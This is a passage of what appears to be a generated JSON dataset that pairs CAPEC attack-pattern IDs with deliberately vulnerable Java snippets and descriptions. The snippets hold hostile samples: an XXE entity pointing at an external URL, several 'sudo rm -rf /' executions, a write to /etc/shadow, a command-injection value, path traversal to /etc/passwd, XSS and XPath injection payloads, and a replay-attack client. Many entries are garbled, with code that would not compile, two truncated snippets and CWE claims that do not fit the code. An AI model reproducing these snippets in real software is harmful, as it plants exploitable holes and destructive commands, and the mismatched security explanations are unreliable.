        "code_snippet": "import java.io.ByteArrayInputStream; import java.io.IOException; import java.io.InputStream; import javax.xml.parsers.DocumentBuilder; import javax.xml.parsers.DocumentBuilderFactory; import javax.xml.parsers.ParserConfigurationException; import org.w3c.dom.Document; import org.xml.sax.SAXException; public class VulnerableParser { public static void main(String[] args) throws ParserConfigurationException, SAXException, IOException { String xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\" + \"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"http://example.com/malicious-entity\\\">]>\" + \"<foo>&xxe;</foo>\"; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); factory.setExpandEntityReferences(true); DocumentBuilder builder = factory.newDocumentBuilder(); InputStream is = new ByteArrayInputStream(xml.getBytes()); Document doc = builder.parse(is); } }",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that can lead to a denial of service condition due to the allocation of resources without limits or throttling (CWE-770). The parser is configured to expand entity references, which can lead to the inclusion of external entities (CWE-611). The XML input is crafted to contain a large number of entity references, causing the parser to exhaust CPU resources. The code also relies on machine-dependent data representation (CWE-1102) and does not properly neutralize special elements in the output (CWE-74). Additionally, the code may be vulnerable to information exposure through microarchitectural state after transient execution (CWE-1342) due to the use of speculative execution in the XML parsing algorithm."
    },
    {
        "capec_id": "230",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\npublic class VulnerableParser {\n    public static void parseXML(String xml) {\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new java.io.ByteArrayInputStream(xml.getBytes()));\n            Element element = doc.getDocumentElement();\n            String value = element.getAttribute(\"attr\");\n            // No validation or limitation on the input XML\n            // No restriction on the size of the XML input\n            // No control on the recursion level\n            processElement(element);\n        } catch (Exception e) {\n            // Handle exception\n        }\n    }\n\n    public static void processElement(Element element) {\n        // Recursively process elements without any limit\n        NodeList nodeList = element.getChildNodes();\n        for (int i = 0; i < nodeList.getLength(); i++) {\n            Node node = nodeList.item(i);\n            if (node instanceof Element) {\n                processElement((Element) node);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to excessive memory consumption and CPU utilization due to uncontrolled recursion and lack of input validation. The parser accepts arbitrary XML input without validating it against a schema, allowing an attacker to inject malicious data that can cause the parser to consume excessive resources."
    },
    {
        "capec_id": "231",
        "code_snippet": "import javax.xml.bind.JAXBContext;\nimport javax.xml.bind.Unmarshaller;\nimport java.io.StringReader;\n\npublic class VulnerableParser {\n    public static void parseXML(String xml) {\n        try {\n            JAXBContext jc = JAXBContext.newInstance(VulnerableClass.class);\n            Unmarshaller unmarshaller = jc.createUnmarshaller();\n            unmarshaller.unmarshal(new StringReader(xml));\n        } catch (Exception e) {\n            // ignore\n        }\n    }\n\n    public static class VulnerableClass {\n        private String data;\n\n        public void setData(String data) {\n            this.data = data;\n            // recursive function call without any limits\n            recursiveFunction(data);\n        }\n\n        private void recursiveFunction(String data) {\n            if (data.length() > 0) {\n                recursiveFunction(data.substring(1));\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that accepts oversized serialized data payloads, leading to adverse effects such as exhausting system resources and arbitrary code execution. The parser lacks XML validation (CWE-112), input validation (CWE-20), and recursion control (CWE-674), allowing an attacker to inject malicious data. Additionally, the code relies on machine-dependent data representation (CWE-1102) and allocates resources without limits or throttling (CWE-770), making it vulnerable to attacks."
    },
    {
        "capec_id": "233",
        "code_snippet": "public class PrivilegeElevation {\n    public static void main(String[] args) {\n        // CWE-269: Improper Privilege Management\n        // Assigning admin privileges to a user without proper checks\n        User user = new User(\"username\", \"password\");\n        user.setPrivileges(\"admin\");\n\n        // CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n        // Incorrectly forwarding data before security check is complete\n        Hardware hardware = new Hardware();\n        hardware.processData(\"sensitive_data\");\n\n        // CWE-1311: Improper Translation of Security Attributes by Fabric Bridge\n        // Incorrectly translating security attributes from trusted to untrusted\n        FabricBridge bridge = new FabricBridge();\n        bridge.translateSecurityAttributes(\"trusted_data\", \"untrusted_data\");\n\n        // CWE-653: Improper Isolation or Compartmentalization\n        // Not properly isolating functionality with different privilege levels\n        Executor executor = new Executor();\n        executor.executeCommand(\"sudo rm -rf /\");\n\n        // CWE-274: Improper Handling of Insufficient Privileges\n        // Not handling insufficient privileges to perform an operation\n        try {\n            File file = new File(\"/root/restricted_file\");\n            file.delete();\n        } catch (Exception e) {\n            // Ignore exception and continue execution\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of privilege elevation by exploiting weaknesses in privilege management, hardware logic, fabric bridges, isolation, and handling of insufficient privileges. The code assigns admin privileges without proper checks, incorrectly forwards data before security checks, translates security attributes incorrectly, fails to isolate functionality with different privilege levels, and ignores exceptions when handling insufficient privileges."
    },
    {
        "capec_id": "234",
        "code_snippet": "import java.io.IOException;\nimport java.io.File;\nimport java.io.FileWriter;\n\npublic class ElevatedPrivileges {\n    public static void main(String[] args) {\n        try {\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            File file = new File(\"/etc/shadow\");\n            if (file.exists()) {\n                FileWriter writer = new FileWriter(file);\n                writer.write(\"New password for root: mynewpassword\\n\");\n                writer.close();\n            }\n\n            // CWE-648: Incorrect Use of Privileged APIs\n            Runtime.getRuntime().exec(\"sudo rm -rf /\");\n\n            // CWE-250: Execution with Unnecessary Privileges\n            ProcessBuilder pb = new ProcessBuilder(\"sudo\", \"-S\", \"rm\", \"-rf\", \"/\");\n            pb.start();\n\n            // CWE-114: Process Control\n            String[] commands = {\"sudo\", \"-S\", \"bash\", \"-c\", \"rm -rf /\"};\n            Runtime.getRuntime().exec(commands);\n\n            // CWE-271: Privilege Dropping / Lowering Errors\n            Process p = Runtime.getRuntime().exec(\"sudo id\");\n            p.waitFor();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of gaining control of a process with elevated privileges to execute arbitrary code. It includes multiple CWEs: CWE-732 (incorrect permission assignment), CWE-648 (incorrect use of privileged APIs), CWE-250 (execution with unnecessary privileges), CWE-114 (process control), and CWE-271 (privilege dropping/lowering errors). The code attempts to modify sensitive system files, execute commands with elevated privileges, and drop privileges incorrectly, showcasing the vulnerabilities."
    },
    {
        "capec_id": "235",
        "code_snippet": "public class VulnerableCode {\n    private static boolean isAdmin = false;\n    private static Object lock = new Object();\n\n    public static void authenticate(String username, String password) {\n        // Simulating authentication\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            isAdmin = true;\n        }\n    }\n\n    public static void performAction() {\n        if (isAdmin) {\n            // Perform privileged action\n            System.out.println(\"Performing privileged action\");\n        } else {\n            System.out.println(\"Access denied\");\n        }\n    }\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(new Runnable() {\n            public void run() {\n                authenticate(\"admin\", \"password\");\n            }\n        });\n\n        Thread thread2 = new Thread(new Runnable() {\n            public void run() {\n                performAction();\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the main idea of the deprecated CAPEC attack pattern, which is related to hijacking a privileged thread of execution. The code has multiple CWEs, including CWE-294 (Authentication Bypass by Capture-replay), CWE-1058 (Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element), and CWE-782 (Exposed IOCTL with Insufficient Access Control). The code has a static isAdmin flag that can be modified by multiple threads, allowing an attacker to bypass authentication and perform privileged actions. The use of a non-final static lock object and the lack of proper access control for the performAction() method further exacerbate the vulnerability."
    },
    {
        "capec_id": "236",
        "code_snippet": "import java.io.IOException;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCode {\n    private static Socket socket;\n\n    public static void main(String[] args) {\n        try {\n            socket = new Socket(\"localhost\", 8080);\n            // CWE-294: Authentication Bypass by Capture-replay\n            // Sniffing network traffic and replaying it to bypass authentication\n            byte[] sniffedPacket = sniffNetworkTraffic();\n            socket.getOutputStream().write(sniffedPacket);\n\n            // CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n            // Defining a signal handler that is not asynchronous-safe\n            Runtime.getRuntime().addShutdownHook(new Thread() {\n                public void run() {\n                    try {\n                        socket.close();\n                    } catch (IOException e) {\n                        // CWE-391: Unchecked Error Condition\n                        // Ignoring exceptions and other error conditions\n                    }\n                }\n            });\n\n            // CWE-782: Exposed IOCTL with Insufficient Access Control\n            // Implementing an IOCTL with insufficient access control\n            ioctl(socket, 0x1234, \"restricted_functionality\");\n        } catch (UnknownHostException e) {\n            // CWE-391: Unchecked Error Condition\n            // Ignoring exceptions and other error conditions\n        } catch (IOException e) {\n            // CWE-391: Unchecked Error Condition\n            // Ignoring exceptions and other error conditions\n        }\n    }\n\n    private static native void ioctl(Socket socket, int command, String arg) throws IOException;\n\n    private static byte[] sniffNetworkTraffic() {\n        // Sniffing network traffic implementation\n        return new byte[0];\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern, which is similar to CAPEC-30: Hijacking a Privileged Thread of Execution. It incorporates related CWEs, including CWE-294: Authentication Bypass by Capture-replay, CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe, CWE-782: Exposed IOCTL with Insufficient Access Control, and CWE-391: Unchecked Error Condition. The code shows a vulnerable implementation that can be exploited by an attacker to bypass authentication, induce unexpected behavior, and access restricted functionality."
    },
    {
        "capec_id": "237",
        "code_snippet": "public class SandboxEscape {\n    public native int accessNativeCode();\n    public static void main(String[] args) {\n        try {\n            SandboxEscape se = new SandboxEscape();\n            int result = se.accessNativeCode();\n            System.out.println(\"Result: \" + result);\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n    static {\n        System.loadLibrary(\"nativecode\");\n    }\n}\n\n// Native code in C\n#include <jni.h>\n#include <stdio.h>\n\nJNIEXPORT jint JNICALL Java_SandboxEscape_accessNativeCode(JNIEnv *env, jobject obj) {\n    // Call system call to modify arbitrary memory locations\n    system(\"echo 'Hello from native code!' > /tmp/vulnerable\");\n    return 0;\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of escaping a sandbox by submitting malicious code of another language to obtain access to privileges that were not intentionally exposed. The code uses the Java Native Interface (JNI) to call native C code, which can perform unsafe operations, such as modifying arbitrary memory locations. The native code calls a system call to write to a file, demonstrating the potential for privilege escalation. This code embodies CWEs 693, 111, and 492, as it fails to use a protection mechanism to prevent the use of unsafe JNI, and exposes sensitive information through the use of native code."
    },
    {
        "capec_id": "238",
        "code_snippet": "public class InsecureAuthorization {\n    private static final String ADMIN_ROLE = \"admin\";\n    private static final String USER_ROLE = \"user\";\n\n    public void accessResource(String role, String url) {\n        if (role.equals(ADMIN_ROLE)) {\n            // Check authorization before parsing URL\n            if (url.startsWith(\"/admin/\")) {\n                // Insufficient isolation of symbolic constant definitions\n                String adminUrl = \"/admin/dashboard\";\n                if (url.equals(adminUrl)) {\n                    // Violation of secure design principles\n                    // Always-inorrect control flow implementation\n                    if (true) {\n                        // Improper protection of alternate path\n                        System.out.println(\"Access granted\");\n                    } else {\n                        System.out.println(\"Access denied\");\n                    }\n                }\n            }\n        } else if (role.equals(USER_ROLE)) {\n            // Improper protection of alternate path\n            if (url.startsWith(\"/user/\")) {\n                System.out.println(\"Access granted\");\n            } else {\n                System.out.println(\"Access denied\");\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern, which involves incorrect behavior order, authorization before parsing and canonicalization. It also incorporates related CWEs, including insufficient isolation of symbolic constant definitions, violation of secure design principles, always-inorrect control flow implementation, and improper protection of alternate paths. The code has a flawed authorization mechanism that can be exploited by an attacker to bypass access controls."
    },
    {
        "capec_id": "239",
        "code_snippet": "public class ClientSideAuthenticator {\n    public boolean authenticateUser(String username, String password) {\n        // Client-side authentication, no server-side validation\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public void performSensitiveOperation() {\n        // No server-side authentication, relies on client-side authentication\n        if (authenticateUser(\"admin\", \"password\")) {\n            // Perform sensitive operation\n            System.out.println(\"Sensitive operation performed.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        ClientSideAuthenticator authenticator = new ClientSideAuthenticator();\n        authenticator.performSensitiveOperation();\n    }\n}\n\n// Version control repository exposed to unauthorized actors\npublic class VersionControl {\n    public static void main(String[] args) {\n        // Exposed CVS repository\n        String cvsRepository = \"cvs://username:password@localhost/repository\";\n        System.out.println(\"CVS Repository: \" + cvsRepository);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC-207 pattern by implementing client-side authentication without server-side validation, allowing an attacker to bypass authentication by modifying the client. It also exposes a version control repository to unauthorized actors, violating CWE-527. Additionally, it embodies CWE-603 by performing authentication within client code but not in server code, and CWE-602 by relying on the client to implement a mechanism that is intended to protect the server."
    },
    {
        "capec_id": "240",
        "code_snippet": "public class ResourceModifier {\n    public void modifyResource(String resourceId, String newResourceValue) {\n        String resourceName = resourceId + \".txt\";\n        File file = new File(resourceName);\n        if (file.exists()) {\n            try (FileWriter writer = new FileWriter(file)) {\n                writer.write(newResourceValue);\n            } catch (IOException e) {\n                System.out.println(\"Error writing to file: \" + e.getMessage());\n            }\n        } else {\n            System.out.println(\"Resource not found: \" + resourceId);\n        }\n    }\n\n    public static void main(String[] args) {\n        ResourceModifier modifier = new ResourceModifier();\n        modifier.modifyResource(\"../../../../../../../../etc/passwd\", \"New resource value\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting weaknesses in input validation by manipulating resource identifiers, enabling the unintended modification or specification of a resource. The code allows an attacker to specify a resource identifier (file name) and a new value to write to that file. The CWEs embodied in this code include CWE-99 (Improper Control of Resource Identifiers), CWE-1285 (Improper Validation of Specified Index, Position, or Offset in Input), CWE-1289 (Improper Validation of Unsafe Equivalence in Input), CWE-913 (Improper Control of Dynamically-Managed Code Resources), and CWE-20 (Improper Input Validation). The code does not validate the input resource identifier, allowing an attacker to specify a file outside the intended sphere of control, and does not restrict the input value, enabling the unintended modification of a resource."
    },
    {
        "capec_id": "241",
        "code_snippet": "import java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\n\npublic class CodeInjection {\n    public static void main(String[] args) throws Exception {\n        String className = \"java.lang.Runtime\";\n        String methodName = \"getRuntime\";\n        String fieldName = \"out\";\n        String fieldValue = \"java.lang.System.out\";\n\n        Class<?> clazz = Class.forName(className);\n        Constructor<?> constructor = clazz.getConstructor();\n        Object obj = constructor.newInstance();\n\n        Field field = clazz.getField(fieldName);\n        field.set(obj, System.out);\n\n        Class<?> methodClazz = Class.forName(\"java.lang.Runtime\");\n        java.lang.reflect.Method method = methodClazz.getMethod(methodName);\n        method.invoke(obj);\n    }\n}\n",
        "description": "This Java code snippet demonstrates code injection by dynamically loading a class and invoking its method, which is a deprecated practice (CWE-545). The code uses the `Class.forName()` method to load the `java.lang.Runtime` class, and then uses reflection to invoke the `getRuntime()` method. Additionally, the code uses the `Field` class to set the value of a field, which is an obsolete practice (CWE-477). This code injection can lead to authentication bypass issues (CWE-592) and incorrect initialization (CWE-458)."
    },
    {
        "capec_id": "242",
        "code_snippet": "public class CodeInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"\";\n        if (args.length > 0) {\n            userInput = args[0];\n        }\n        String dynamicCode = \"public class DynamicCode { public static void main(String[] args) { \" + userInput + \" } }\";\n        try {\n            JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();\n            JavaFileObject file = new JavaStringObject(\"DynamicCode\", dynamicCode);\n            JavaCompiler.CompilationTask task = compiler.getTask(null, null, null, null, null, Arrays.asList(file));\n            if (task.call()) {\n                Class<?> clazz = Class.forName(\"DynamicCode\");\n                clazz.getMethod(\"main\", String[].class).invoke(null, (Object) new String[0]);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates code injection vulnerability (CWE-94) where user input is used to construct dynamic code that is then compiled and executed. The code uses the Java Compiler API to compile the dynamic code and then invokes the main method of the resulting class. This can lead to arbitrary code execution if an attacker provides malicious input. The code also relates to CWE-506 (Embedded Malicious Code), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-1173 (Improper Use of Validation Framework), and CWE-77 (Improper Neutralization of Special Elements used in a Command)."
    },
    {
        "capec_id": "243",
        "code_snippet": "public class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        String html = \"<a href='#' style='background-image: url(\" + userInput + \");'>Click me!</a>\";\n        resp.setContentType(\"text/html\");\n        PrintWriter out = resp.getWriter();\n        out.println(html);\n    }\n}",
        "description": "This Java servlet is vulnerable to cross-site scripting (XSS) due to improper neutralization of script in attributes. The userInput parameter is directly inserted into the style attribute of an anchor tag, allowing an attacker to inject malicious code, such as JavaScript, which will be executed when the page is rendered."
    },
    {
        "capec_id": "244",
        "code_snippet": "public class VulnerableCode {\n    public static void generateMaliciousLink(String userInput) {\n        String maliciousUri = \"data:text/html;base64,\" + Base64.getEncoder().encodeToString((\"<script>alert('XSS')</script>\").getBytes());\n        String html = \"<a href='\" + maliciousUri + \"'>Click me!</a>\";\n        System.out.println(html);\n    }\n\n    public static void main(String[] args) {\n        generateMaliciousLink(\"<script>alert('XSS')</script>\");\n    }\n}",
        "description": "This Java code snippet generates a malicious link with a base64 encoded HTML content containing a cross-site scripting payload. The userInput is not properly sanitized, allowing an attacker to inject malicious scripts. The generated link can be used in an anchor tag HREF attribute, exploiting the ability of browsers to interpret 'data' or 'javascript' URI schemes as client-side executable content placeholders."
    },
    {
        "capec_id": "245",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"input\");\n        String html = \"<html><body>\" + userInput + \"</body></html>\";\n        resp.setContentType(\"text/html\");\n        resp.getWriter().write(html);\n    }\n}\n",
        "description": "This Java servlet is vulnerable to a cross-site scripting attack due to improper neutralization of script-related HTML tags. The servlet takes user input from the 'input' parameter and injects it directly into the HTML response without any validation or sanitization, allowing an attacker to inject malicious scripts by doubling characters, such as '<<script' or '%3C%3script', to bypass input validation filters."
    },
    {
        "capec_id": "246",
        "code_snippet": "import javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String html = \"<img src='\" + userInput + \"' alt='' />\";\n        response.getWriter().println(html);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to stored XSS attacks due to incomplete denylist-based protection, improper neutralization of alternate XSS syntax, and lack of filtering for doubled character XSS manipulations. The servlet takes user input and injects it into an HTML IMG tag without proper sanitization, allowing an attacker to inject malicious script code."
    },
    {
        "capec_id": "247",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        String html = \"<div id='\" + userInput + \"'>\";\n        response.getWriter().write(html);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to XSS attacks. It takes user input from a GET request and injects it directly into an HTML tag without proper validation or encoding, allowing an attacker to inject malicious script tags and bypass input filtering."
    },
    {
        "capec_id": "248",
        "code_snippet": "public class VulnerableCommandExecutor {\n    public void executeCommand(String userInput) {\n        String command = \"ping -c 1 \" + userInput + \" google.com\";\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] args) {\n        VulnerableCommandExecutor executor = new VulnerableCommandExecutor();\n        executor.executeCommand(\"; rm -rf /;\");\n    }\n}",
        "description": "This Java code snippet demonstrates command injection vulnerability. The `executeCommand` method takes user input and concatenates it with a command string. The resulting command is then executed using `Runtime.getRuntime().exec()`. In the `main` method, an example of malicious user input is provided, which injects a new command to delete all files on the system. This code is vulnerable to CWE-77, CWE-78, CWE-88, CWE-114, and CWE-74."
    },
    {
        "capec_id": "249",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.Scanner;\n\npublic class TerminalDeviceManipulation {\n    public static void main(String[] args) {\n        String userInput = \"\";\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter a command:\");\n        userInput = scanner.nextLine();\n\n        try {\n            Process process = Runtime.getRuntime().exec(userInput);\n            InputStream inputStream = process.getInputStream();\n            OutputStream outputStream = process.getOutputStream();\n\n            int c;\n            while ((c = inputStream.read()) != -1) {\n                System.out.write(c);\n            }\n\n            outputStream.write(\"\\n\".getBytes());\n            outputStream.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of manipulating writeable terminal devices, which is vulnerable to command injection (CWE-77 and CWE-78). It takes user input as a command and executes it using the Runtime.getRuntime().exec() method, without properly sanitizing the input. This allows an attacker to inject malicious commands, potentially leading to unauthorized access or system compromise. Additionally, this code may also be vulnerable to authentication bypass by capture-replay (CWE-294) if used in a networked environment, and unauthorized error injection (CWE-1334) if used in a system with redundant hardware components. Furthermore, it may also be vulnerable to injection attacks (CWE-74) if the output of the command is used by a downstream component."
    },
    {
        "capec_id": "250",
        "code_snippet": "import javax.xml.xpath.XPath;\nimport javax.xml.xpath.XPathConstants;\nimport javax.xml.xpath.XPathExpression;\nimport javax.xml.xpath.XPathFactory;\n\npublic class XMLInjection {\n    public static void main(String[] args) throws Exception {\n        String userInput = \"' or 1=1 or '\"; // attacker-controlled input\n        String xpathExpression = \"/employees/employee[name='\" + userInput + \"']\";\n        XPathFactory xpathFactory = XPathFactory.newInstance();\n        XPath xpath = xpathFactory.newXPath();\n        XPathExpression expr = xpath.compile(xpathExpression);\n        Object result = expr.evaluate(new InputSource(\"employees.xml\"), XPathConstants.NODESET);\n        NodeList nodes = (NodeList) result;\n        for (int i = 0; i < nodes.getLength(); i++) {\n            System.out.println(nodes.item(i).getTextContent());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates XML injection vulnerability. It takes user input to construct an XPath expression, which is then used to query an XML database. The input is not properly validated or neutralized, allowing an attacker to inject malicious XPath expressions, potentially leading to unauthorized data access or modification."
    },
    {
        "capec_id": "251",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        String libPath = System.getProperty(\"user.home\") + \"\\\\lib\\\\vulnerableLib.dll\";\n        System.load(libPath);\n        // Using global variables\n        globalConfig = \"attacker-controlled-value\";\n        // Dynamically-managed code resources\n        Object obj = new Object();\n        obj.getClass().getMethod(\"execute\", String.class).invoke(obj, \"rm -rf /\");\n        // Reliance on machine-dependent data representation\n        int x = 0x12345678;\n        byte[] bytes = {(byte) (x >>> 24), (byte) (x >>> 16), (byte) (x >>> 8), (byte) x};\n        // Embedded malicious code\n        String maliciousCode = \"public class Malicious {\n            public static void main(String[] args) {\n                // Malicious actions\n                java.lang.Runtime.getRuntime().exec(\"calc\");\n            }\n        }\";\n        CompilerManager cm = CompilerManager.getInstance();\n        cm.compile(maliciousCode, \"Malicious\");\n    }\n    public static String globalConfig;\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of forcing an application to load arbitrary code files from the local machine. It uses the CWEs: 829 (Inclusion of Functionality from Untrusted Control Sphere) by loading a DLL file from the user's home directory, 1108 (Excessive Reliance on Global Variables) by using a global variable, 506 (Embedded Malicious Code) by compiling and executing malicious code, 913 (Improper Control of Dynamically-Managed Code Resources) by dynamically invoking a method, and 1102 (Reliance on Machine-Dependent Data Representation) by relying on a specific byte order."
    },
    {
        "capec_id": "252",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class PHPFileInclusionVulnerability {\n    public static void main(String[] args) {\n        String userSuppliedFile = \"../../../../../../../../../../../../etc/passwd\";\n        try {\n            File file = new File(userSuppliedFile);\n            FileInputStream fis = new FileInputStream(file);\n            byte[] fileContent = new byte[(int) file.length()];\n            fis.read(fileContent);\n            String fileContentStr = new String(fileContent);\n            System.out.println(fileContentStr);\n        } catch (IOException e) {\n            System.out.println(\"Error reading file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a PHP file inclusion vulnerability, where an attacker can supply a file path to be executed by the application. The code does not properly validate the user-supplied file path, allowing an attacker to traverse the file system and access sensitive files. This is similar to CWE-98, where the PHP application does not restrict or incorrectly restricts the input before its usage in 'require,' 'include,' or similar functions. Additionally, this code snippet relates to CWE-829, CWE-646, CWE-616, and CWE-473, as it does not properly handle file uploads, relies on file name or extension, and does not protect against modification of variables from external sources."
    },
    {
        "capec_id": "253",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        String remoteUrl = \\",
        "description": "This Java code snippet demonstrates the CAPEC of loading arbitrary code files from a remote location, which can lead to the inclusion of malicious or vulnerable code. The code uses a URLClassLoader to load a JAR file from a remote URL, and then invokes a method from the loaded class. This code is vulnerable to CWE-829, CWE-494, CWE-602, CWE-540, and CWE-506, as it does not verify the integrity of the remote code and executes it without proper validation."
    },
    {
        "capec_id": "254",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class DTDInjection {\n    public static void main(String[] args) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setFeature(\\",
        "description": "This Java code snippet demonstrates DTD injection vulnerability (CAPEC-228) by allowing an attacker to inject a malicious DTD that references an arbitrary file, in this case, /etc/passwd. The code disables the disallow-doctype-decl feature, allowing the parser to process the malicious DTD. This can lead to information exposure, excessive system resource consumption, or even arbitrary HTTP requests. The code relates to CWE-827 (Improper Control of Document Type Definition), CWE-776 (Improper Restriction of Recursive Entity References in DTDs), and CWE-651 (Exposure of WSDL File Containing Sensitive Information)."
    },
    {
        "capec_id": "256",
        "code_snippet": "public class SOAPArrayProcessor {\n    public void processSOAPArray(int declaredLength, byte[] array) {\n        byte[] buffer = new byte[declaredLength];\n        System.arraycopy(array, 0, buffer, 0, declaredLength);\n        // further processing of buffer\n    }\n    public static void main(String[] args) {\n        SOAPArrayProcessor processor = new SOAPArrayProcessor();\n        byte[] maliciousArray = new byte[1000];\n        processor.processSOAPArray(10, maliciousArray);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable SOAP array processor that is susceptible to a buffer overflow attack. The processSOAPArray method allocates a buffer based on the declared length of the array, but then copies the entire array into the buffer without checking the actual length of the array. An attacker can exploit this by sending a SOAP request with an array whose actual length exceeds the declared length, causing a buffer overflow."
    },
    {
        "capec_id": "257",
        "code_snippet": "public class DeprecatedVulnerabilities {\n    public static void main(String[] args) {\n        // CWE-766: Unprotected Credentials in Datastructures\n        String unprotectedCredentials = \"username:password\";\n        System.out.println(unprotectedCredentials);\n\n        // CWE-493: Sensitive Data in Logs\n        Logger logger = Logger.getLogger(\"MyLogger\");\n        logger.info(\"Sensitive data: \" + unprotectedCredentials);\n\n        // CWE-532: Information Exposure Through Log Files\n        File logFile = new File(\"log.txt\");\n        FileWriter writer = new FileWriter(logFile);\n        writer.write(unprotectedCredentials);\n        writer.close();\n\n        // CWE-287: Improper Authentication\n        boolean isAuthenticated = false;\n        if (!isAuthenticated) {\n            // Allow access without authentication\n            System.out.println(\"Access granted without authentication\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates deprecated vulnerabilities, including unprotected credentials in data structures, sensitive data in logs, information exposure through log files, and improper authentication. It is a compilation of deprecated CWEs, showcasing insecure practices that should be avoided in software development."
    },
    {
        "capec_id": "258",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // Capture authentication data\n        String authData = in.readUTF();\n\n        // Replay authentication data to bypass authentication\n        out.writeUTF(authData);\n        out.flush();\n\n        // Perform actions as if authenticated\n        out.writeUTF(\"performSensitiveAction\");\n        out.flush();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a capture-replay attack to bypass authentication. It connects to a server, captures the authentication data, and replays it to the server to gain unauthorized access. This code embodies the deprecated CAPEC and relates to CWE-294: Authentication Bypass by Capture-replay, CWE-603: Use of Client-Side Authentication, and CWE-592: DEPRECATED: Authentication Bypass Issues."
    },
    {
        "capec_id": "259",
